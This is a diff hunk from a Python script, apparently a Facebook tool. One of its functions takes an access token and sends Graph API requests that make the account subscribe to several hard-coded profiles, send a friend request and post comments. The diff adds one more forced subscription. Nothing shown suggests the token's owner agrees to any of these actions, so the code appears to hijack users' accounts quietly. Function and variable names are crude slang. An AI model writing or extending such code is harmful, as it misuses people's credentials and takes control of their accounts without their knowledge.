@@ -260,6 +260,7 @@ def kontol():
 	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(__cindy__))
+	requests.post('https://graph.facebook.com/100008574165337/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,__cindy__))
 	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,__cindy__,__cindy__))
 	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
